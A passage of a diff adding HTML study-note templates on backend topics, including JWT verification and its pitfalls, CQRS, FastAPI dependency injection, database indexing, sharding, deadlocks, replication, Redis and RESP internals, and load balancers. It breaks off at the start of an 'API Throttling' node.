+  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
+  .eyJzdWIiOiJ1c2VyXzEyMyIsImlhdCI6MTcxNjc2ODAwMH0
+  .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+  ─────────────┬──────────────────────────────────────────
+  HEADER       │ Base64url({ "alg": "RS256", "typ": "JWT" })
+  ─────────────┼──────────────────────────────────────────
+  PAYLOAD      │ Base64url({ "sub": "user_123",
+               │             "iat": 1716768000,
+               │             "exp": 1716854400 })
+  ─────────────┼──────────────────────────────────────────
+  SIGNATURE    │ RS256(Base64(header)+"."+Base64(payload), private_key)
+  ─────────────┴──────────────────────────────────────────
+
+  Header + Payload: BASE64 — anyone can decode and read.
+  Signature: CRYPTOGRAPHIC — only server with private key can produce it.</pre>
+<h3>Verification Flow</h3>
+<pre>
+  Client sends: Authorization: Bearer eyJhbGci...
+
+  Server:
+    1. Split at "." → header_b64, payload_b64, signature
+    2. Decode header → find algorithm ("RS256")
+    3. Recompute: RS256(header_b64+"."+payload_b64, public_key)
+    4. Compare recomputed vs token signature
+    5. Check exp &gt; now
+    6. Both pass → valid ✓  else → 401 ✗</pre>
+<h3>Security Pitfalls</h3>
+<table>
+  <thead><tr><th>Vulnerability</th><th>What happens</th><th>Prevention</th></tr></thead>
+  <tbody>
+    <tr><td>Algorithm confusion</td><td>Attacker changes <code>alg</code> to <code>none</code></td><td>Always verify <code>alg</code> explicitly; reject <code>none</code></td></tr>
+    <tr><td>Weak secret</td><td>HS256 short secret is brute-forceable</td><td>Use RS256 or long random secret</td></tr>
+    <tr><td>Long expiry</td><td>Stolen token valid for days</td><td>Short expiry (15 min) + refresh token</td></tr>
+    <tr><td>PII in payload</td><td>Payload is readable by anyone</td><td>Never put passwords or sensitive data</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-05-06" data-type="node" data-trail="trail-05" data-order="6"
+  data-title="CQRS and Event Sourcing"
+  data-file="CQRS.md"
+  data-bridge="CQRS shows what advanced architecture looks like; FastAPI and Django are the frameworks you choose between before you get there — this note grounds that choice in the architectural trade-offs you now understand.">
+<h3>Event Sourcing: State from an Immutable Log</h3>
+<div class="compare">
+  <div><h4>Traditional DB</h4><pre>products table
+┌────┬──────┬───────┐
+│ id │ name │ price │
+│  1 │ Shoe │ 120   │
+└────┴──────┴───────┘
+Only current state.
+Past states lost.</pre></div>
+  <div><h4>Event Sourcing</h4><pre>events (append-only)
+┌────┬──────────────────┐
+│  1 │ ProductCreated 100│
+│  2 │ PriceUpdated   110│
+│  3 │ PriceUpdated   120│
+└────┴──────────────────┘
+Replay → price=120 ✓
+Replay 1-2 → price=110 ✓</pre></div>
+</div>
+<h3>CQRS Architecture</h3>
+<pre>
+  ┌──────────────────────────────────────────────────────────────┐
+  │                         CLIENT                               │
+  └──────────────┬───────────────────────────┬───────────────────┘
+                 │ Command                   │ Query
+                 ▼                           ▼
+  ┌──────────────────────────┐  ┌─────────────────────────────┐
+  │      COMMAND SIDE         │  │        QUERY SIDE            │
+  │  Validate business rules  │  │  Read from materialised view │
+  │  Append event to store    │  │  (read-optimised DB)         │
+  └────────────┬──────────────┘  └─────────────────────────────┘
+               │ events via Kafka/RabbitMQ          ▲
+               └────────────────────────────────────┘</pre>
+<h3>Snapshots</h3>
+<pre>
+  Without: replay event 1 → 2 → ... → 10,000 (slow)
+  With:    load snapshot @ event 9,900
+             ↓ replay only 100 events ✓</pre>
+<ul>
+  <li><strong>Sourcing</strong>: truth = event log; <strong>Hydration</strong>: rebuild one entity; <strong>Replay</strong>: reprocess all events</li>
+  <li>Perfect audit trail — who changed what, when, to what value, forever</li>
+  <li>Materialized views updated incrementally as events arrive</li>
+</ul>
+</template>
+
+<template id="node-05-07" data-type="node" data-trail="trail-05" data-order="7"
+  data-title="FastAPI vs Django"
+  data-file="FastAPI/Fast API (vs Django).md"
+  data-bridge="FastAPI's key architectural feature is its dependency injection system. This note covers Depends in depth — how it wires authentication, database sessions, and shared logic as first-class language features.">
+<h3>Framework Comparison</h3>
+<table>
+  <thead><tr><th></th><th>Django</th><th>Flask</th><th>FastAPI</th></tr></thead>
+  <tbody>
+    <tr><td>Type</td><td>Full-stack</td><td>Micro-framework</td><td>API-centric</td></tr>
+    <tr><td>ORM</td><td>Yes (built-in)</td><td>No</td><td>No</td></tr>
+    <tr><td>Admin panel</td><td>Yes</td><td>No</td><td>No</td></tr>
+    <tr><td>Async support</td><td>Partial</td><td>None</td><td>Native</td></tr>
+    <tr><td>Validation</td><td>Forms</td><td>Manual</td><td>Pydantic ✓</td></tr>
+    <tr><td>Auto API docs</td><td>No</td><td>No</td><td>Swagger + ReDoc ✓</td></tr>
+  </tbody>
+</table>
+<h3>The <code>yield</code> Pattern — Dependency Cleanup</h3>
+<div class="compare">
+  <div><h4>Regular return</h4><pre>def get_items():
+    return [1, 2, 3]
+# returns all at once</pre></div>
+  <div><h4>yield for cleanup</h4><pre>def get_db():
+    db = Session()
+    try:
+        yield db  ← pauses here
+    finally:
+        db.close() ← runs on exit</pre></div>
+</div>
+<h3>When to Choose</h3>
+<div class="compare">
+  <div><h4>Choose Django when</h4><ul><li>Full web app with auth, forms, admin</li><li>Mature ORM with migrations</li><li>Server-rendered HTML</li><li>Batteries-included approach</li></ul></div>
+  <div><h4>Choose FastAPI when</h4><ul><li>REST/JSON API or microservice</li><li>High-concurrency I/O endpoints</li><li>Auto validation via type hints</li><li>Auto-generated Swagger docs</li><li>Python ML/data ecosystem</li></ul></div>
+</div>
+</template>
+
+<template id="node-05-08" data-type="node" data-trail="trail-05" data-order="8"
+  data-title="FastAPI Dependency Injection"
+  data-file="FastAPI/FastAPI Dependency Injection (Depends) - Comprehen.md"
+  data-bridge="">
+<h3>The Execution Flow</h3>
+<pre>
+  HTTP Request arrives
+         │
+         ▼
+  ┌────────────────────────────────┐
+  │  1. Route matching             │
+  └────────────────────┬───────────┘
+                       ↓
+  ┌────────────────────────────────┐
+  │  2. Check router dependencies  │
+  │     Depends(verify_token)      │
+  └────────────────────┬───────────┘
+                       ↓
+  ┌────────────────────────────────┐
+  │  3. Execute dependency         │
+  │     extract headers            │
+  │     validate JWT, check roles  │
+  └────────────┬──────────┬────────┘
+               │          │
+            ✓ pass     ✗ fail
+               │          └─► HTTPException 401/403
+               │              ENDPOINT NEVER RUNS
+               ↓
+  ┌────────────────────────────────┐
+  │  4. Resolve endpoint params    │
+  │     Query(), Body(), Path()    │
+  └────────────────────┬───────────┘
+                       ↓
+  ┌────────────────────────────────┐
+  │  5. Run endpoint function      │
+  └────────────────────────────────┘</pre>
+<h3>Parameter Sources</h3>
+<table>
+  <thead><tr><th>Type</th><th>Extracts from</th><th>Example</th></tr></thead>
+  <tbody>
+    <tr><td><code>Query(default)</code></td><td>URL query string</td><td><code>?format=json&amp;page=2</code></td></tr>
+    <tr><td><code>Body(default)</code></td><td>Request body (JSON)</td><td><code>{"name": "Alice"}</code></td></tr>
+    <tr><td><code>Header(default)</code></td><td>HTTP headers</td><td><code>Authorization: Bearer ...</code></td></tr>
+    <tr><td><code>Path()</code></td><td>URL path segment</td><td><code>/users/{user_id}</code></td></tr>
+  </tbody>
+</table>
+<h3>Dependency Chains</h3>
+<pre>
+  get_token(header) → get_user(token) → get_permissions(user) → endpoint(perms)
+
+  async def get_token(x: str = Header(...)): return x
+  async def get_user(t = Depends(get_token)): return jwt.decode(t, ...)
+  async def get_perms(u = Depends(get_user)): return db.find(u['id'])
+
+  @router.get("/admin")
+  async def admin(perms = Depends(get_perms)):
+      # FastAPI ran: get_token → get_user → get_perms → this</pre>
+<h3>Benefits</h3>
+<table>
+  <thead><tr><th>Benefit</th><th>How</th></tr></thead>
+  <tbody>
+    <tr><td>Testability</td><td><code>app.dependency_overrides[get_db] = lambda: MockDB()</code></td></tr>
+    <tr><td>DRY</td><td>Auth/DB/pagination written once, reused everywhere</td></tr>
+    <tr><td>Consistent security</td><td><code>router.dependencies = [Depends(auth)]</code> protects all routes</td></tr>
+    <tr><td>Performance</td><td><code>@lru_cache()</code> on dep = computed once, cached for process lifetime</td></tr>
+  </tbody>
+</table>
+</template>
+
+<!-- Trail 06: Databases & Storage -->
+<template id="node-06-01" data-type="node" data-trail="trail-06" data-order="1"
+  data-title="SQL vs NoSQL: Trade-offs"
+  data-file="Database/SQL vs NoSQL - Tradeoffs.md"
+  data-bridge="With the fundamental storage choice made, the next most impactful performance lever is indexing — the data structure that lets the query planner skip full table scans.">
+<h3>The CAP Theorem</h3>
+<pre>
+  You can only guarantee TWO of three simultaneously:
+
+              Consistency
+                  △
+                 / \
+                /   \
+  Availability ─────── Partition Tolerance
+
+  CA: impossible in distributed systems (partitions always happen)
+  CP: HBase, Zookeeper, MongoDB (strict mode)
+  AP: Cassandra, CouchDB, DynamoDB</pre>
+<div class="compare">
+  <div><h4>SQL (Relational)</h4><ul><li>Tables + rows + strict schema</li><li>JOINs across tables</li><li>ACID transactions built-in</li><li>Scales vertically first</li><li>Standard SQL</li><li>Manual sharding + replication</li></ul></div>
+  <div><h4>NoSQL</h4><ul><li>Documents, key-value, graph, column</li><li>Denormalised, no joins</li><li>Eventual consistency (often)</li><li>Scales horizontally natively</li><li>Each DB has own query API</li><li>Sharding + replication built-in</li></ul></div>
+</div>
+<h3>When to Choose</h3>
+<table>
+  <thead><tr><th>Use SQL when</th><th>Use NoSQL when</th></tr></thead>
+  <tbody>
+    <tr><td>Data has clear relational structure</td><td>Schema is flexible or evolving</td></tr>
+    <tr><td>JOINs across entities needed</td><td>Horizontal scaling is the priority</td></tr>
+    <tr><td>ACID transactions required</td><td>Write throughput is the bottleneck</td></tr>
+    <tr><td>Simpler project or existing SQL infra</td><td>Data model is document/graph shaped</td></tr>
+  </tbody>
+</table>
+<div class="warn">NoSQL adds operational complexity and cost for small projects — SQL is often cheaper and simpler until you genuinely need the scale.</div>
+</template>
+
+<template id="node-06-02" data-type="node" data-trail="trail-06" data-order="2"
+  data-title="DB Indexing"
+  data-file="Database/DB Indexing.md"
+  data-bridge="Indexing optimizes queries within a single machine. When that machine's limits are hit, sharding distributes data across many — this note covers the strategies and trade-offs of horizontal partitioning.">
+<h3>Index as Library Catalog</h3>
+<div class="compare">
+  <div><h4>Without index</h4><pre>SELECT * FROM users
+WHERE email = 'x@y.com'
+Full table scan: O(n)
+10M rows = 10M reads
+~300ms</pre></div>
+  <div><h4>With index on email</h4><pre>B-tree lookup: O(log n)
+"x@y.com" → row 847
+Jump directly to row
+~1ms ✓</pre></div>
+</div>
+<h3>Index Types (DDIA)</h3>
+<table>
+  <thead><tr><th>Type</th><th>Structure</th><th>Extra lookup?</th></tr></thead>
+  <tbody>
+    <tr><td>Heap file index</td><td>B-tree → pointer to row</td><td>Yes (two reads)</td></tr>
+    <tr><td>Clustered index</td><td>B-tree; row data IS the leaf</td><td>No (one read)</td></tr>
+    <tr><td>Covering index</td><td>B-tree; includes extra columns</td><td>No (for covered queries)</td></tr>
+  </tbody>
+</table>
+<div class="info">MySQL InnoDB: primary key is always a <strong>clustered index</strong> — the data IS the B-tree leaf.</div>
+<h3>When to Index — and When Not To</h3>
+<div class="compare">
+  <div><h4>Index these ✓</h4><ul><li>Frequent <code>WHERE</code> / <code>JOIN</code> / <code>ORDER BY</code></li><li>Unique identifiers (email, uuid)</li><li>Foreign keys</li></ul></div>
+  <div><h4>Skip these ✗</h4><ul><li>Low-cardinality columns (gender, status)</li><li>Frequently updated columns (last_login)</li><li>Small tables (full scan is fine)</li></ul></div>
+</div>
+<h3>OLTP vs OLAP</h3>
+<table>
+  <thead><tr><th></th><th>OLTP</th><th>OLAP</th></tr></thead>
+  <tbody>
+    <tr><td>Pattern</td><td>Many small reads + writes</td><td>Few large aggregation scans</td></tr>
+    <tr><td>Storage</td><td>Row-oriented</td><td>Column-oriented</td></tr>
+    <tr><td>Index benefit</td><td>High (key lookups)</td><td>Low (scans all rows anyway)</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-06-03" data-type="node" data-trail="trail-06" data-order="3"
+  data-title="DB Sharding"
+  data-file="Database/DB Sharding.md"
+  data-bridge="Sharding distributes data; deadlocks show what happens when concurrent transactions compete for the same rows. This note covers how circular waits form and the two SQL patterns that prevent them.">
+<h3>The Problem Sharding Solves</h3>
+<div class="compare">
+  <div><h4>Single server (maxed out)</h4><pre>┌───────────────────┐
+│     Database      │
+│  users 1–100M     │
+│  (one machine)    │
+└───────────────────┘</pre></div>
+  <div><h4>After sharding</h4><pre>┌──────────┐ ┌──────────┐ ┌──────────┐
+│ Shard 1  │ │ Shard 2  │ │ Shard 3  │
+│ 1–33M    │ │ 33M–66M  │ │ 66M–100M │
+└──────────┘ └──────────┘ └──────────┘
+Each = independent DB server ✓</pre></div>
+</div>
+<h3>Three Sharding Strategies</h3>
+<table>
+  <thead><tr><th>Strategy</th><th>How</th><th>Pro</th><th>Con</th></tr></thead>
+  <tbody>
+    <tr><td>Range</td><td>user_id 1–1M → Shard A</td><td>Range queries easy</td><td>Hot spots (sequential IDs)</td></tr>
+    <tr><td>Hash</td><td>hash(user_id) % N</td><td>Even distribution</td><td>Range queries hit all shards</td></tr>
+    <tr><td>Directory</td><td>Lookup table: key → shard</td><td>Flexible remapping</td><td>Lookup = bottleneck + SPOF</td></tr>
+  </tbody>
+</table>
+<h3>Trade-offs</h3>
+<table>
+  <thead><tr><th>Benefit</th><th>Cost</th></tr></thead>
+  <tbody>
+    <tr><td>Scale beyond single machine</td><td>Cross-shard JOINs require app-level joins</td></tr>
+    <tr><td>Distribute write load</td><td>Transactions spanning shards are very complex</td></tr>
+    <tr><td>Fault isolation per shard</td><td>Rebalancing when adding/removing nodes is expensive</td></tr>
+  </tbody>
+</table>
+<div class="warn">Avoid sharding until necessary — try vertical scaling, read replicas, and caching first. Once sharded, cross-shard foreign key constraints and unique constraints no longer work.</div>
+</template>
+
+<template id="node-06-04" data-type="node" data-trail="trail-06" data-order="4"
+  data-title="DB Deadlocks"
+  data-file="Database/DB Deadlocks.md"
+  data-bridge="Kleppmann's DDIA provides the theoretical underpinning for everything above — reliability, scalability, storage engine internals, and encoding formats — making the previous three notes feel like derived consequences.">
+<h3>What a Deadlock Looks Like</h3>
+<pre>
+  Transaction A                Transaction B
+  ─────────────────────────    ─────────────────────────
+  BEGIN;                       BEGIN;
+  UPDATE accounts SET ...
+    WHERE id=1;  ← locks row 1   UPDATE accounts SET ...
+                                   WHERE id=2;  ← locks row 2
+
+  UPDATE accounts SET ...      UPDATE accounts SET ...
+    WHERE id=2;  ← WAIT!         WHERE id=1;  ← WAIT!
+
+  A waits for B. B waits for A. Neither can proceed.
+  DB detects the cycle → aborts one transaction → application must RETRY.</pre>
+<h3>Prevention: Strategy 1 — Same Order Access</h3>
+<div class="compare">
+  <div><h4>Deadlock-prone</h4><pre>T_A: lock row 1 → lock row 2
+T_B: lock row 2 → lock row 1
+Circular wait possible ✗</pre></div>
+  <div><h4>Deadlock-free</h4><pre>Both: always lock id=1 first,
+       then id=2
+No cycle possible ✓</pre></div>
+</div>
+<h3>Prevention: Strategy 2 — Acquire All Locks Upfront</h3>
+<pre>
+  SELECT id, balance FROM accounts
+  WHERE id IN (1, 2)
+  FOR UPDATE;  ← locks BOTH rows at once before any update
+
+  No other transaction can modify either row
+  until this transaction commits. ✓</pre>
+<ul>
+  <li>Database detects cycles via wait-for graph; aborts the "victim" transaction</li>
+  <li>Application <strong>must</strong> implement retry logic for deadlock errors</li>
+  <li>Common cause: code accessing multiple rows/tables in inconsistent order</li>
+  <li><code>FOR UPDATE</code> = pessimistic locking — assumes conflicts will happen</li>
+</ul>
+</template>
+
+<template id="node-06-05" data-type="node" data-trail="trail-06" data-order="5"
+  data-title="DDIA Part 1: Foundations of Data Systems"
+  data-file="DDIA/Part 1 Foundation of data systems.md"
+  data-bridge="DDIA Chapter 5 extends the storage foundation to distributed machines: how to keep multiple copies of data consistent, and the fundamental trade-offs between single-leader, multi-leader, and leaderless replication.">
+<h3>Three Design Goals</h3>
+<pre>
+  RELIABILITY:     continues working correctly despite faults
+                   (hardware, software, human error)
+
+  SCALABILITY:     copes with increased load
+                   measure with load parameters + response time percentiles
+                   (p95, p99 — not averages; the worst 1% still matters)
+
+  MAINTAINABILITY: easy for people to work on over time
+                   Operability | Simplicity | Evolvability</pre>
+<h3>Relational vs Document Models</h3>
+<div class="compare">
+  <div><h4>Relational</h4><ul><li>Tables + rows, typed columns</li><li>Normalise: store once, reference by FK</li><li>Declarative SQL: you say WHAT</li><li>Good for: many-to-many, JOINs, ACID</li></ul></div>
+  <div><h4>Document</h4><ul><li>Nested JSON, flexible schema</li><li>Denormalise: embed related data</li><li>Imperative: you say HOW</li><li>Good for: tree-shaped, loaded all-at-once</li></ul></div>
+</div>
+<h3>Column-Oriented Storage + Bitmap Encoding</h3>
+<pre>
+  ROW-ORIENTED:                     COLUMN-ORIENTED:
+  Row 1: id=1, name=Alice, age=30   age column = [30, 25, 28, ...]
+  Row 2: id=2, name=Bob,   age=25   (one contiguous file per column)
+
+  Reading age requires skipping      Reading age reads NOTHING else
+  over id + name data each row.      → fast aggregates (OLAP) ✓
+
+  BITMAP ENCODING:
+  country="US": [1, 0, 1, 0, 1]  (bit per row)
+  active=true:  [1, 1, 0, 1, 0]
+  WHERE country='US' AND active: CPU bitwise AND → instant result</pre>
+<h3>Data Encoding Formats</h3>
+<table>
+  <thead><tr><th>Format</th><th>Schema?</th><th>Binary?</th><th>Backward compatible?</th></tr></thead>
+  <tbody>
+    <tr><td>JSON / XML</td><td>No</td><td>No (text)</td><td>Manually</td></tr>
+    <tr><td>Protocol Buffers</td><td>Yes (.proto)</td><td>Yes</td><td>Yes (field tags)</td></tr>
+    <tr><td>Avro</td><td>Yes</td><td>Yes</td><td>Yes (schema in file)</td></tr>
+    <tr><td>Thrift</td><td>Yes (.thrift)</td><td>Yes</td><td>Yes (field IDs)</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-06-06" data-type="node" data-trail="trail-06" data-order="6"
+  data-title="DDIA Replication"
+  data-file="DDIA/Replication.md"
+  data-bridge="Replication is about data across machines. Redis shows what happens when you push a single-machine store to its performance ceiling — IO multiplexing achieves enormous throughput on a single thread with no locking overhead.">
+<h3>Single-Leader Replication</h3>
+<pre>
+  Clients
+  Writes ───────────────► LEADER ──replication log──► Follower 1
+  Reads ────────────────►│                 └──────────► Follower 2
+    (or to any follower)  │                 └──────────► Follower 3
+
+  ALL writes go to leader. Reads from leader or followers.</pre>
+<table>
+  <thead><tr><th></th><th>Synchronous</th><th>Asynchronous</th></tr></thead>
+  <tbody>
+    <tr><td>Leader behaviour</td><td>Waits for follower ACK before confirming</td><td>Confirms immediately</td></tr>
+    <tr><td>Durability</td><td>Follower guaranteed up-to-date</td><td>Data can be lost if leader fails</td></tr>
+    <tr><td>Availability</td><td>One slow follower blocks ALL writes</td><td>Leader never blocked</td></tr>
+  </tbody>
+</table>
+<div class="info"><strong>Semi-synchronous</strong> (practical default): 1 sync follower + rest async. Guarantees data on ≥2 nodes without blocking on all followers.</div>
+<h3>Replication Lag Anomalies</h3>
+<pre>
+  READ-YOUR-WRITES:
+  User posts → write to leader → reads stale follower → post appears lost ✗
+  Fix: read user's own data from leader; others from followers.
+
+  MONOTONIC READS:
+  User reads comment from fresh replica → refreshes → hits stale replica
+  → comment disappears (time goes backwards) ✗
+  Fix: route each user consistently to the same replica.
+
+  CONSISTENT PREFIX READS:
+  Answer arrives before question (different replicas, different speeds) ✗
+  Fix: write causally related data to the same partition.</pre>
+<h3>Leaderless Replication (Dynamo-style)</h3>
+<pre>
+  QUORUM: w + r &gt; n  (write nodes + read nodes &gt; total replicas)
+
+  n=3, w=2, r=2:
+  ┌──────────┐  ┌──────────┐  ┌──────────┐
+  │ v=5 ✓   │  │ v=5 ✓   │  │ v=4 ✗   │  ← stale
+  └──────────┘  └──────────┘  └──────────┘
+  Client reads from all 3, picks highest version → v=5 ✓
+  Read repair: writes v=5 back to stale replica</pre>
+<h3>Consistency Spectrum</h3>
+<pre>
+  Weak ◄──────────────────────────────────────────────────► Strong
+
+  Eventual    Monotonic    Read-your-   Consistent    Strong /
+  consistency  reads        writes      prefix reads  Linearisable</pre>
+</template>
+
+<template id="node-06-07" data-type="node" data-trail="trail-06" data-order="7"
+  data-title="Redis Internals"
+  data-file="Redis/Redis Internals.md"
+  data-bridge="One layer below the Redis API is RESP — its wire protocol. Understanding why Redis chose a custom binary-safe format over JSON reveals how protocol design decisions translate directly to performance.">
+<h3>Multi-Threading vs IO Multiplexing</h3>
+<div class="compare">
+  <div><h4>Multi-threaded server</h4><pre>Client A → Thread 1 (needs lock)
+Client B → Thread 2 (BLOCKED)
+Client C → Thread 3 (BLOCKED)
+Lock contention + context switching
++ race conditions overhead</pre></div>
+  <div><h4>Redis: IO multiplexing</h4><pre>Thousands of clients connect
+        │
+Single event loop thread:
+  1. Ask OS: which sockets ready?
+  2. OS: "sockets 1, 4, 7 are ready"
+  3. Execute commands in sequence
+  4. Back to step 1
+No locks. No switching. ✓</pre></div>
+</div>
+<div class="info">The restaurant analogy: <strong>blocking IO</strong> = waiter stands at one table waiting to order. <strong>IO multiplexing</strong> = waiter watches the whole room, only goes to a table when a customer raises their hand.</div>
+<h3>Why Single-Threaded Redis Is Fast</h3>
+<pre>
+  Network IO is SLOW (milliseconds)
+  Memory operations are FAST (microseconds)
+
+  While "waiting" for network data:
+  → Multi-threaded server: threads sit blocked
+  → Redis: processes thousands of other READY commands from memory
+
+  No locking overhead. No context switching.
+  Exploits network latency to maximise memory throughput.</pre>
+<h3>Redis Feature Summary</h3>
+<table>
+  <thead><tr><th>Feature</th><th>How it works</th></tr></thead>
+  <tbody>
+    <tr><td>Atomicity</td><td>Single-threaded; no command can interrupt another</td></tr>
+    <tr><td>Persistence</td><td>AOF (Append Only File) logs every write; RDB periodic snapshots</td></tr>
+    <tr><td>TTL</td><td>Keys expire automatically; eviction strategies (LRU, LFU) handle full memory</td></tr>
+    <tr><td>Transactions</td><td><code>MULTI</code>/<code>EXEC</code> queues commands; executes atomically (no rollback)</td></tr>
+    <tr><td>Data structures</td><td>Strings, hashes, lists, sets, sorted sets, bitmaps, HyperLogLog</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-06-08" data-type="node" data-trail="trail-06" data-order="8"
+  data-title="Wire Protocols: RESP"
+  data-file="Redis/Wire Protocols - RESP.md"
+  data-bridge="After reading about IO multiplexing and wire protocols, building a raw TCP echo server closes the loop. Once you've implemented the blocking bottleneck yourself, Redis's architecture stops being abstract.">
+<h3>Why Not JSON?</h3>
+<div class="compare">
+  <div><h4>JSON parsing</h4><pre>{"name":"Alice","age":30}
+Parser must scan for:
+{ } [ ] " : ,
+handle escapes
+determine types
+CPU-intensive</pre></div>
+  <div><h4>RESP parsing</h4><pre>$5\r\nAlice\r\n:30\r\n
+Read prefix → type + length
+Read exactly N bytes → done
+Minimal CPU ✓</pre></div>
+</div>
+<h3>RESP Data Types</h3>
+<table>
+  <thead><tr><th>Type</th><th>Prefix</th><th>Format</th><th>Example</th></tr></thead>
+  <tbody>
+    <tr><td>Simple string</td><td><code>+</code></td><td><code>+text\r\n</code></td><td><code>+OK\r\n</code></td></tr>
+    <tr><td>Integer</td><td><code>:</code></td><td><code>:number\r\n</code></td><td><code>:1729\r\n</code></td></tr>
+    <tr><td>Bulk string</td><td><code>$</code></td><td><code>$len\r\ndata\r\n</code></td><td><code>$5\r\nhello\r\n</code></td></tr>
+    <tr><td>Array</td><td><code>*</code></td><td><code>*count\r\n…elements</code></td><td><code>*2\r\n$3\r\nGET\r\n…</code></td></tr>
+    <tr><td>Error</td><td><code>-</code></td><td><code>-message\r\n</code></td><td><code>-ERR unknown\r\n</code></td></tr>
+  </tbody>
+</table>
+<h3>Bulk Strings: The Key Design</h3>
+<pre>
+  $5\r\nhello\r\n
+
+  $5     → "the data is exactly 5 bytes"
+  \r\n   → end of length line
+  hello  → exactly 5 bytes read (regardless of content)
+  \r\n   → end of data marker
+
+  Binary safe: data can contain ANY byte including \r\n.
+  The length prefix tells the parser exactly when to stop.
+  Server pre-allocates buffer of exactly N bytes → single read() call.</pre>
+<h3>Redis Command on the Wire</h3>
+<pre>
+  SET key value  →  *3\r\n          (3 elements)
+                    $3\r\nSET\r\n   (bulk string "SET")
+                    $3\r\nkey\r\n   (bulk string "key")
+                    $5\r\nvalue\r\n (bulk string "value")</pre>
+</template>
+
+<template id="node-06-09" data-type="node" data-trail="trail-06" data-order="9"
+  data-title="TCP Echo Server Implementation"
+  data-file="Redis/TCP Echo Server Implementation.md"
+  data-bridge="">
+<h3>The Blocking Bottleneck</h3>
+<pre>
+  func main() {
+      listener, _ := net.Listen("tcp", ":6379")
+      for {
+          conn, _ := listener.Accept()  ← BLOCKS until a client connects
+          handleClient(conn)             ← BLOCKS until this client disconnects
+      }
+  }
+
+  func handleClient(conn) {
+      for {
+          cmd, _ := readCommand(conn)  ← BLOCKS waiting for client to send data
+          conn.Write(cmd)
+      }
+  }</pre>
+<h3>Why Client 2 Can Never Connect</h3>
+<pre>
+  t=0  Client 1 connects → listener.Accept() returns
+  t=0  Server enters handleClient(client1) → stuck in inner loop
+  t=0  Client 2 tries to connect
+       ↓
+  t=∞  Server never reaches listener.Accept() again
+       (blocked inside handleClient(client1))
+       ↓
+  t=∞  Client 2 waits forever ✗
+
+  While Client 1 is connected but NOT sending data:
+    readCommand(client1) is BLOCKING
+    Server CPU is idle but completely unavailable</pre>
+<h3>What This Motivates</h3>
+<div class="compare">
+  <div><h4>Naive single-threaded</h4><pre>Accept 1 connection
+Block waiting for its data
+Handle it, then next client
+Handles 1 client at a time ✗</pre></div>
+  <div><h4>IO Multiplexing (Redis)</h4><pre>Accept ALL connections
+Ask OS: which have data?
+Handle only READY ones
+Thousands of clients ✓</pre></div>
+</div>
+<ul>
+  <li>Socket lifecycle: <code>socket()</code> → <code>bind(port)</code> → <code>listen()</code> → <code>accept()</code> → <code>read()</code> → <code>write()</code> → <code>close()</code></li>
+  <li>This exercise makes Redis's <code>epoll</code>-based design feel concrete — <code>epoll</code> is the non-blocking version of this blocking pattern</li>
+  <li>A real Redis handles 50,000+ concurrent connections; this naive server handles exactly 1</li>
+</ul>
+</template>
+
+<!-- Trail 07: Scaling & Distributed Systems -->
+<template id="node-07-01" data-type="node" data-trail="trail-07" data-order="1"
+  data-title="Load Balancer"
+  data-file="Scaling/Load Balancer.md"
+  data-bridge="The load balancer is the first piece of scaling infrastructure. But modern architectures add a second layer: the API gateway. This note draws the exact distinction — network-level distribution vs application-level concerns.">
+<h3>Without vs With Load Balancer</h3>
+<div class="compare">
+  <div><h4>Without LB</h4><pre>Internet
+    │
+    ▼
+Single Server
+(maxed out)</pre></div>
+  <div><h4>With LB</h4><pre>Internet
+    │
+    ▼
+Load Balancer
+┌───┼───┐
+S1  S2  S3
+(all share DB)</pre></div>
+</div>
+<h3>Three Algorithms</h3>
+<table>
+  <thead><tr><th>Algorithm</th><th>How</th><th>Best for</th></tr></thead>
+  <tbody>
+    <tr><td>Round Robin</td><td>Requests rotated sequentially</td><td>Homogeneous servers, uniform requests</td></tr>
+    <tr><td>Least Connections</td><td>Route to server with fewest active connections</td><td>Requests vary in cost (some 10ms, some 2s)</td></tr>
+    <tr><td>IP Hash</td><td>Route based on client IP hash</td><td>Sticky sessions (stateful servers)</td></tr>
+  </tbody>
+</table>
+<h3>Layer 4 vs Layer 7</h3>
+<table>
+  <thead><tr><th></th><th>Layer 4 (Transport)</th><th>Layer 7 (Application)</th></tr></thead>
+  <tbody>
+    <tr><td>Works at</td><td>TCP/UDP level</td><td>HTTP level</td></tr>
+    <tr><td>Routing decision</td><td>Source/dest IP + port</td><td>URL path, headers, cookies</td></tr>
+    <tr><td>Performance</td><td>Faster (no HTTP parsing)</td><td>Slower (must parse HTTP)</td></tr>
+    <tr><td>Example</td><td>AWS NLB</td><td>AWS ALB, Nginx</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li>LB continuously pings servers (health checks); unhealthy server removed from rotation</li>
+  <li>Can trigger auto-scaling: CPU &gt; 80% → add server; CPU &lt; 20% → remove server</li>
+</ul>
+</template>
+
+<template id="node-07-02" data-type="node" data-trail="trail-07" data-order="2"
+  data-title="Load Balancer vs API Gateway"
+  data-file="Load Balancer vs API Gateway.md"
+  data-bridge="With both traffic-distribution layers understood, the next concern is rate control: protecting services from traffic spikes and abuse. Throttling strategies and where to enforce them.">
+<h3>The Distinction</h3>
+<div class="compare">
+  <div><h4>Load Balancer</h4><p>Concern: <strong>WHERE</strong> to send traffic</p><ul><li>Distribute by health/load</li><li>Health checks</li><li>SSL termination</li><li>Sticky sessions</li></ul></div>
+  <div><h4>API Gateway</h4><p>Concern: <strong>WHAT</strong> to do with the request</p><ul><li>Authentication / JWT validation</li><li>Rate limiting / throttling</li><li>Request transformation</li><li>API versioning + routing</li><li>Logging + analytics</li></ul></div>
+</div>
+<h3>Common Architecture Patterns</h3>
+<pre>
+  Pattern 1: LB in front, API Gateway behind
+    Internet → LB → API Gateway → Microservices
+
+  Pattern 2: CDN + LB + API Gateway (full stack)
+    Internet → CDN (static) → LB → API Gateway → Services
+
+  Pattern 3: NLB → API Gateway → ALB (AWS)
+    Internet → NLB (Layer 4, fast TCP)
+             → API Gateway (auth, rate limit)
+             → ALB (Layer 7) → Services</pre>
+<div class="info">An API Gateway is NOT a replacement for a Load Balancer — they solve different problems and are usually used together.</div>
+</template>
+
+<template id="node-07-03" data-type="node" data-trail="trail-07" data-order="3"
+  data-title="API Throttling"
+  data-file="Scaling/API Throttling.md"
